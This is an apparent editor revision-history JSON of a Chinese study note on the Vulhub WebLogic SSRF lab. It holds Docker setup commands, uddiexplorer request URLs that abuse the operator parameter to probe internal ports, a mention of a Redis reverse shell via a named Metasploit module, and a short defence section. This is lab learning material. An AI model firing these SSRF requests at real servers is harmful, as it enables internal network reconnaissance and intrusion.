{"compress":true,"commitItems":[["b5e6f569-9396-42d3-ba9d-8d011b9bce4f",1569141491967,"",[[1569141440313,["whale@Whale",[[1,0,"weblogic ssrf\n===\n\n\n"]],[0,0],[20,20]]],[1569141555545,["whale@Whale",[[1,20,"\n![1]($res/1.PNG)\n"]],[20,20],[38,38]]],[1569141567431,["whale@Whale",[[1,19,"ssrf"]],[19,19],[23,23]]],[1569141694094,["whale@Whale",[[1,23,"s"]],[23,23],[24,24]]],[1569141694677,["whale@Whale",[[-1,23,"s"]],[24,24],[23,23]]],[1569141699766,["whale@Whale",[[1,23,"是服务端请求伪造"]],[23,23],[31,31]]],[1569142812639,["whale@Whale",[[1,31,"，意思是"]],[31,31],[35,35]]],[1569142862238,["whale@Whale",[[1,35,"服务器接受我们的请求后，然后向内网发起扫描等有害操作。"]],[35,35],[62,62]]]]],["8bccf094-1344-4508-baf7-51c09100dafc",1569158796751,"weblogic ssrf\n===\n\nssrf是服务端请求伪造，意思是服务器接受我们的请求后，然后向内网发起扫描等有害操作。\n\n![1]($res/1.PNG)\n",[[1569158769049,["whale@Whale",[[1,62,"漏洞"]],[62,62],[64,64]]],[1569158770565,["whale@Whale",[[-1,62,"漏洞"]],[64,64],[62,62]]],[1569158777050,["whale@Whale",[[1,62,"该漏洞出现的原因是"]],[62,62],[71,71]]],[1569158842702,["whale@Whale",[[1,71,"服务器需要向内网其他机器获取资源，在请求的过程中，参数可修改"]],[71,71],[101,101]]],[1569158843412,["whale@Whale",[[-1,99,"修改"]],[101,101],[99,99]]],[1569158853466,["whale@Whale",[[1,99,"被攻击方修改。"]],[99,99],[106,106]]],[1569158857098,["whale@Whale",[[1,108,"\n"]],[106,106],[107,107]]],[1569158857805,["whale@Whale",[[1,109,"\n"]],[107,107],[108,108]]],[1569158858737,["whale@Whale",[[-1,109,"\n"]],[108,108],[107,107]]],[1569158859038,["whale@Whale",[[-1,108,"\n"]],[107,107],[106,106]]],[1569158859639,["whale@Whale",[[1,108,"\n"]],[106,106],[107,107]]],[1569158859852,["whale@Whale",[[1,109,"\n"]],[107,107],[108,108]]],[1569158863334,["whale@Whale",[[1,108,"ssrf是"]],[108,108],[113,113]]],[1569158873940,["whale@Whale",[[-1,108,"ssrf是"]],[113,113],[108,108]]],[1569158874335,["whale@Whale",[[-1,109,"\n"]],[108,108],[107,107]]],[1569158875832,["whale@Whale",[[1,109,"\n"]],[107,107],[108,108]]],[1569158888080,["whale@Whale",[[1,108,"下图是weblogic典型的界面。"]],[108,108],[125,125]]]]],["d13abaca-5ae5-4c2e-ba42-bc5b617e4572",1569208500442,"weblogic ssrf\n===\n\nssrf是服务端请求伪造，意思是服务器接受我们的请求后，然后向内网发起扫描等有害操作。该漏洞出现的原因是服务器需要向内网其他机器获取资源，在请求的过程中，参数可被攻击方修改。\n\n下图是weblogic典型的界面。\n\n![1]($res/1.PNG)\n",[[1569208447172,["whale@Whale",[[-1,118,"c"]],[119,119],[118,118]]],[1569208449513,["whale@Whale",[[1,118,"c"]],[118,118],[119,119]]],[1569208462402,["whale@Whale",[[-1,125,"\n"],[1,126,"x"]],[125,126],[126,126]]],[1569208463200,["whale@Whale",[[-1,125,"x"]],[126,126],[125,125]]],[1569208471095,["whale@Whale",[[1,125,"下面我们看看怎么利用他"]],[125,125],[136,136]]],[1569208471651,["whale@Whale",[[-1,135,"他"]],[136,136],[135,135]]],[1569208472660,["whale@Whale",[[1,135,"它。"]],[135,135],[137,137]]],[1569208476261,["whale@Whale",[[1,155,"\n"]],[154,154],[155,155]]],[1569208476466,["whale@Whale",[[1,156,"\n"]],[155,155],[156,156]]]]],["3a6dc922-246c-474d-9bb3-9a8f603007e2",1569336077403,"weblogic ssrf\n===\n\nssrf是服务端请求伪造，意思是服务器接受我们的请求后，然后向内网发起扫描等有害操作。该漏洞出现的原因是服务器需要向内网其他机器获取资源，在请求的过程中，参数可被攻击方修改。\n\n下图是weblogic典型的界面。下面我们看看怎么利用它。\n![1]($res/1.PNG)\n\n\n",[[1569336026340,["whale@Whale",[[1,156,"https://www.lshack.cn/category/oscp/"]],[156,156],[192,192]]]]],["c27ade89-4c42-4dfb-ace9-fab7aa51572e",1569483229556,"weblogic ssrf\n===\n\nssrf是服务端请求伪造，意思是服务器接受我们的请求后，然后向内网发起扫描等有害操作。该漏洞出现的原因是服务器需要向内网其他机器获取资源，在请求的过程中，参数可被攻击方修改。\n\n下图是weblogic典型的界面。下面我们看看怎么利用它。\n![1]($res/1.PNG)\n\nhttps://www.lshack.cn/category/oscp/\n",[[1569483205478,["whale@Whale",[[1,19,"\n"]],[18,18],[19,19]]],[1569483209203,["whale@Whale",[[1,19,"## dockerko"]],[19,19],[30,30]]],[1569483209648,["whale@Whale",[[-1,28,"ko"]],[30,30],[28,28]]],[1569483212625,["whale@Whale",[[1,28,"空间管理"]],[28,28],[32,32]]],[1569483212763,["whale@Whale",[[1,33,"\n"]],[32,32],[33,33]]],[1569483223228,["whale@Whale",[[1,33,"du -h --max-depth=1 寻找当前目录，哪个文件夹占用空间最大\r\n"]],[33,33],[73,73]]],[1569483289694,[null,[[-1,71,"\r"],[1,72,"\n"]],[71,71],[73,73]]],[1569483289698,[null,[[1,71,"\r"],[-1,71,"\n"]],[73,73],[71,71]]],[1569483231888,["whale@Whale",[[1,71,"\ndocker system prune -a  删除镜像"],[1,73,"docker system df 查看磁盘使用情况\r\ndocker-compose down -v 删除正在用的实例"]],[72,72],[160,160]]],[1569483233912,["whale@Whale",[[-1,100,"\r"],[-1,127,"\r"],[1,160,"\n"]],[158,158],[159,159]]],[1569483234291,["whale@Whale",[[1,160,"\n"]],[159,159],[160,160]]],[1569483235222,["whale@Whale",[[1,33,"\n"]],[32,32],[33,33]]],[1569483237971,["whale@Whale",[[1,33,"```"]],[33,33],[36,36]]],[1569483239235,["whale@Whale",[[1,163,"```"]],[163,163],[166,166]]],[1569483243089,["whale@Whale",[[1,167,"## sss"]],[167,167],[173,173]]],[1569483243815,["whale@Whale",[[-1,172,"s"]],[173,173],[172,172]]],[1569483244121,["whale@Whale",[[1,172,"rf"]],[172,172],[174,174]]],[1569483259405,["whale@Whale",[[1,122,"   "]],[122,122],[125,125]]],[1569483298257,["whale@Whale",[[1,178,"\n"]],[177,177],[178,178]]],[1569483298443,["whale@Whale",[[1,179,"\n"]],[178,178],[179,179]]],[1569483300399,["whale@Whale",[[1,178,"/usr/share/vulhub-master"]],[178,178],[202,202]]],[1569483358446,["whale@Whale",[[1,178,"cd "]],[178,178],[181,181]]],[1569483590924,["whale@Whale",[[1,205,"/weblogic/"]],[178,206],[215,215]]],[1569483591708,["whale@Whale",[[1,215,"ssrf"]],[215,215],[219,219]]],[1569483592141,["whale@Whale",[[1,221,"\n"]],[219,219],[220,220]]],[1569484048614,["whale@Whale",[[1,220,"docker-compose up -d\r\n"]],[220,220],[242,242]]],[1569484052655,["whale@Whale",[[1,220,"\n"],[-1,240,"\r"]],[220,220],[221,221]]],[1569484058225,["whale@Whale",[[1,220,"docker-compose build"]],[220,220],[240,240]]],[1569484084706,["whale@Whale",[[1,262,"```\npkill rinetd  ##关闭进程\nrinetd -c /etc/rinetd.conf  ##启动转发\n```"]],[262,262],[325,325]]],[1569484087029,["whale@Whale",[[-1,262,"```"]],[262,265],[262,262]]],[1569484087460,["whale@Whale",[[-1,262,"\n"]],[262,262],[261,261]]],[1569484089102,["whale@Whale",[[1,178,"\n"]],[177,177],[178,178]]],[1569484090078,["whale@Whale",[[1,178,"```"]],[178,178],[181,181]]],[1569484302777,["whale@Whale",[[1,18,"c"]],[18,18],[19,19]]],[1569484303438,["whale@Whale",[[-1,18,"c"]],[19,19],[18,18]]],[1569484306116,["whale@Whale",[[1,18,"参考资料：https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf"]],[18,18],[81,81]]],[1569484306713,["whale@Whale",[[1,82,"\n"]],[81,81],[82,82]]],[1569484307417,["whale@Whale",[[1,83,"\n"]],[82,82],[83,83]]],[1569484308354,["whale@Whale",[[-1,83,"\n"]],[83,83],[82,82]]],[1569484393754,["whale@Whale",[[1,527,"http://18.189.18.237:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001"]],[527,527],[726,726]]],[1569484396045,["whale@Whale",[[1,527,"\n"]],[526,526],[527,527]]],[1569484396426,["whale@Whale",[[1,528,"\n"]],[527,527],[528,528]]],[1569484397468,["whale@Whale",[[-1,528,"\n"]],[528,528],[527,527]]],[1569484401763,["whale@Whale",[[1,728,"\n"]],[727,727],[728,728]]],[1569484401953,["whale@Whale",[[1,729,"\n"]],[728,728],[729,729]]],[1569484728989,["whale@Whale",[[1,528,"\n"]],[527,527],[528,528]]],[1569484735872,["whale@Whale",[[1,528,"访问以下地址："]],[528,528],[535,535]]],[1569484754302,["whale@Whale",[[1,737,">An error has occurred"]],[737,737],[759,759]]],[1569484757647,["whale@Whale",[[-1,737,">"]],[737,737],[737,737]]],[1569484759131,["whale@Whale",[[1,737,"ye"]],[737,737],[739,739]]],[1569484759600,["whale@Whale",[[-1,737,"ye"]],[739,739],[737,737]]],[1569484761123,["whale@Whale",[[1,737,"页面提示"]],[737,737],[741,741]]],[1569484889388,["whale@Whale",[[-1,737,"页面提示An error has occurred"]],[737,762],[737,737]]],[1569484895059,["whale@Whale",[[1,536,"\n"]],[535,535],[536,536]]],[1569484895521,["whale@Whale",[[1,536,"·"]],[536,536],[537,537]]],[1569484896258,["whale@Whale",[[-1,536,"·"]],[537,537],[536,536]]],[1569484897033,["whale@Whale",[[1,536,"```"]],[536,536],[539,539]]],[1569484899183,["whale@Whale",[[1,741,"```"]],[741,741],[744,744]]],[1569484904634,["whale@Whale",[[1,741,"\n"]],[740,740],[741,741]]],[1569484904959,["whale@Whale",[[1,741,"http://18.189.18.237:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001"]],[741,741],[940,940]]],[1569484907628,["whale@Whale",[[-1,939,"1"]],[940,940],[939,939]]],[1569484907904,["whale@Whale",[[1,939,"2"]],[939,939],[940,940]]],[1569485003026,["whale@Whale",[[1,945,"\n"]],[944,944],[945,945]]],[1569485009054,["whale@Whale",[[1,946,"![5]($res/5.PNG)\n\n"]],[945,945],[963,963]]],[1569485011315,["whale@Whale",[[-1,945,"\n"]],[945,945],[944,944]]],[1569485027546,["whale@Whale",[[1,945,"\n"]],[944,944],[945,945]]],[1569485028107,["whale@Whale",[[1,945,"y"]],[945,945],[946,946]]],[1569485029467,["whale@Whale",[[-1,945,"y"]],[946,946],[945,945]]],[1569485030678,["whale@Whale",[[1,945,"yon"]],[945,945],[948,948]]],[1569485031411,["whale@Whale",[[-1,945,"yon"]],[948,948],[945,945]]],[1569485036363,["whale@Whale",[[1,945,"用burp intruder可以"]],[945,945],[961,961]]],[1569485055747,["whale@Whale",[[1,961,"看到7001端口开放。"]],[961,961],[972,972]]],[1569485069919,["whale@Whale",[[1,967,"页面显示的长度，和其他"]],[967,967],[978,978]]],[1569485079222,["whale@Whale",[[1,980,"不同，说明7001端口"]],[980,980],[991,991]]],[1569485137824,["whale@Whale",[[1,1013,"\n"]],[1012,1012],[1013,1013]]],[1569485144928,["whale@Whale",[[1,1013,"如果内网有其他漏洞"]],[1013,1013],[1022,1022]]],[1569485145328,["whale@Whale",[[-1,1020,"漏洞"]],[1022,1022],[1020,1020]]],[1569485160976,["whale@Whale",[[1,1020,"web漏洞可以反弹shell，例如redis...也可以"]],[1020,1020],[1048,1048]]],[1569485166429,["whale@Whale",[[1,1048,"通过"]],[1048,1048],[1050,1050]]],[1569485868383,["whale@Whale",[[1,1050,"上面的operator=http://127.0.0.1:7002"]],[1050,1050],[1083,1083]]],[1569485870618,["whale@Whale",[[1,1053,"`"]],[1053,1053],[1054,1054]]],[1569485874385,["whale@Whale",[[1,1084,"`参数"]],[1084,1084],[1087,1087]]],[1569486584334,["whale@Whale",[[1,386,"\n"]],[385,385],[386,386]]],[1569486586072,["whale@Whale",[[1,386,"---"]],[386,386],[389,389]]],[1569486586320,["whale@Whale",[[1,390,"\n"]],[389,389],[390,390]]],[1569486587548,["whale@Whale",[[1,390,"```\ndocker-compose down -v\n```"]],[390,390],[420,420]]],[1569486590793,["whale@Whale",[[-1,390,"```\ndocker-compose down -v\n```"]],[420,420],[390,390]]],[1569486602719,["whale@Whale",[[1,390,"\r\ndocker-compose down -v"]],[390,390],[414,414]]],[1569486604661,["whale@Whale",[[-1,390,"\r\n"]],[390,390],[389,389]]],[1569486744212,["whale@Whale",[[1,1114,"反弹shell"]],[1114,1114],[1121,1121]]],[1569486744747,["whale@Whale",[[1,1122,"\n"]],[1121,1121],[1122,1122]]],[1569486744955,["whale@Whale",[[1,1123,"\n"]],[1122,1122],[1123,1123]]],[1569486749381,["whale@Whale",[[1,1123,"## redis未授权"]],[1123,1123],[1134,1134]]],[1569486749461,["whale@Whale",[[1,1135,"\n"]],[1134,1134],[1135,1135]]],[1569486750230,["whale@Whale",[[1,1135,"/usr/share/vulhub-master/redis/4-unacc"]],[1135,1135],[1173,1173]]],[1569486755171,["whale@Whale",[[1,1135,"cd "]],[1135,1135],[1138,1138]]],[1569486756817,["whale@Whale",[[1,1177,"\n"]],[1176,1176],[1177,1177]]],[1569487265680,["whale@Whale",[[1,1177,"`redis-cli -h`"]],[1177,1177],[1191,1191]]],[1569487528481,["whale@Whale",[[1,1192,"\n"]],[1191,1191],[1192,1192]]],[1569487528827,["whale@Whale",[[1,1193,"\n"]],[1192,1192],[1193,1193]]],[1569487530825,["whale@Whale",[[1,1193,"exploit/linux/redis/redis_unauth_exec "]],[1193,1193],[1231,1231]]],[1569487532378,["whale@Whale",[[1,1232,"\n"]],[1231,1231],[1232,1232]]],[1569487536071,["whale@Whale",[[-1,1177,"`redis-cli -h`"]],[1177,1191],[1177,1177]]],[1569487536521,["whale@Whale",[[-1,1178,"\n"]],[1177,1177],[1176,1176]]],[1569487539322,["whale@Whale",[[1,1178,"\n"]],[1177,1177],[1178,1178]]],[1569487540637,["whale@Whale",[[1,1178,"k"]],[1178,1178],[1179,1179]]],[1569487541083,["whale@Whale",[[-1,1178,"k"]],[1179,1179],[1178,1178]]],[1569487542844,["whale@Whale",[[1,1178,"msfconsole"]],[1178,1178],[1188,1188]]],[1569487640231,["whale@Whale",[[1,1229,"\n"]],[1228,1228],[1229,1229]]],[1569487640446,["whale@Whale",[[1,1230,"\n"]],[1229,1229],[1230,1230]]],[1569487640993,["whale@Whale",[[-1,1230,"\n"]],[1230,1230],[1229,1229]]],[1569487643532,["whale@Whale",[[1,1229,"### p"]],[1229,1229],[1234,1234]]],[1569487644350,["whale@Whale",[[-1,1233,"p"]],[1234,1234],[1233,1233]]],[1569487654091,["whale@Whale",[[1,1233,"frp配置内网端口"]],[1233,1233],[1242,1242]]],[1569487655513,["whale@Whale",[[1,1243,"\n"]],[1242,1242],[1243,1243]]],[1569487655784,["whale@Whale",[[1,1244,"\n"]],[1243,1243],[1244,1244]]],[1569487676305,["whale@Whale",[[1,1243,"因为本地kali是nat网络，没有公网IP，"]],[1243,1243],[1265,1265]]],[1569487676679,["whale@Whale",[[-1,1264,"，"]],[1265,1265],[1264,1264]]],[1569487680754,["whale@Whale",[[1,1264,"。为了反弹shell,fang"]],[1264,1264],[1279,1279]]],[1569487681813,["whale@Whale",[[-1,1274,",fang"]],[1279,1279],[1274,1274]]],[1569487683969,["whale@Whale",[[1,1274,"方便，"]],[1274,1274],[1277,1277]]]]],["66c98ffa-d283-44a6-82ae-3b903f872c26",1569744897365,"weblogic ssrf\n===\n参考资料：https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf\n\n## docker空间管理\n```\ndu -h --max-depth=1 寻找当前目录，哪个文件夹占用空间最大\ndocker system prune -a  删除镜像\ndocker system df    查看磁盘使用情况\ndocker-compose down -v 删除正在用的实例\n```\n## ssrf\n```\ncd /usr/share/vulhub-master/weblogic/ssrf\ndocker-compose build\ndocker-compose up -d\npkill rinetd  ##关闭进程\nrinetd -c /etc/rinetd.conf  ##启动转发\n---\ndocker-compose down -v\n```\n\nssrf是服务端请求伪造，意思是服务器接受我们的请求后，然后向内网发起扫描等有害操作。该漏洞出现的原因是服务器需要向内网其他机器获取资源，在请求的过程中，参数可被攻击方修改。\n\n下图是weblogic典型的界面。下面我们看看怎么利用它。\n![1]($res/1.PNG)\n\n访问以下地址：\n```\nhttp://18.189.18.237:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001\n\nhttp://18.189.18.237:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7002\n```\n用burp intruder可以看到7001页面显示的长度，和其他端口不同，说明7001端口开放。\n![5]($res/5.PNG)\n\n如果内网有其他web漏洞可以反弹shell，例如redis...也可以通过上面的`operator=http://127.0.0.1:7002`参数反弹shell\n\n## redis未授权\ncd /usr/share/vulhub-master/redis/4-unacc\n\nmsfconsole\nexploit/linux/redis/redis_unauth_exec \n\n### frp配置内网端口\n因为本地kali是nat网络，没有公网IP。为了反弹shell方便，\n\nhttps://www.lshack.cn/category/oscp/\n",[[1569744860556,["whale@Whale",[[1,1123,"\n"]],[1121,1121],[1122,1122]]],[1569744860738,["whale@Whale",[[1,1124,"\n"]],[1122,1122],[1123,1123]]],[1569744866840,["whale@Whale",[[1,1123,"## 防御方法"]],[1123,1123],[1130,1130]]],[1569744867264,["whale@Whale",[[1,1132,"\n"]],[1130,1130],[1131,1131]]],[1569744883647,["whale@Whale",[[1,1131,"禁止参数访问内网IP,l"]],[1131,1131],[1143,1143]]],[1569744884182,["whale@Whale",[[-1,1141,",l"]],[1143,1143],[1141,1141]]],[1569744894715,["whale@Whale",[[1,1141,"，例如上文所说的"]],[1141,1141],[1149,1149]]],[1569744900826,["whale@Whale",[[1,1149,"operator参数。"]],[1149,1149],[1160,1160]]],[1569744904431,["whale@Whale",[[1,1131,"\n"]],[1131,1131],[1132,1132]]],[1569744906088,["whale@Whale",[[-1,1131,"\n"]],[1132,1132],[1131,1131]]],[1569744913916,["whale@Whale",[[1,1131,"过滤参数，"]],[1131,1131],[1136,1136]]],[1569744922109,["whale@Whale",[[-1,1167,"## redis未授权\ncd /usr/share/vulhub-master/redis/4-unacc\n\nmsfconsole\nexploit/linux/redis/redis_unauth_exec \n\n### frp配置内网端口\n因为本地kali是nat网络，没有公网IP。为了反弹shell方便，\n\nhttps://www.lshack.cn/category/oscp/"]],[1167,1359],[1167,1167]]],[1569744934855,["whale@Whale",[[1,18,"\n"]],[17,17],[18,18]]],[1569746904804,["whale@Whale",[[-1,14,"==="]],[14,17],[14,14]]],[1569746911416,["whale@Whale",[[-1,0,"weblogic ssrf"]],[0,13],[0,0]]]]]]}